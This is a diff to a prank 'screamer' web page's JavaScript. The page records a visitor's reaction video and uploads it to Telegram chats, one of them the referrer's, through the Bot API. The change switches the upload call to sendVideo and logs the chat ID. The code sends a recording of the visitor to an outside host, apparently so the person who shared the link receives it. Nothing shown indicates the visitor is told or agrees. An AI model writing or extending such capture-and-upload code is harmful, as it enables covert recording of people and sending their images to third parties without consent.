@@ -83,7 +83,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Send video to Telegram bot
     function sendVideoToBot(blob) {
-        console.log('Sending video to bot, blob size:', blob.size);
+        console.log('Sending video to bot, blob size:', blob.size, 'CHAT_ID:', CHAT_ID);
         const caption = 'Видео реакции на скример';
 
         // Send to referrer
@@ -97,10 +97,10 @@ document.addEventListener('DOMContentLoaded', () => {
     function sendVideoToChat(chatId, blob, caption) {
         console.log(`Sending video to chat ${chatId}, blob size: ${blob.size}`);
         const formData = new FormData();
-        formData.append('document', blob, 'reaction.webm');
+        formData.append('video', blob, 'reaction.webm');
         formData.append('caption', caption);
 
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument?chat_id=${chatId}`, {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${chatId}`, {
             method: 'POST',
             body: formData
         })
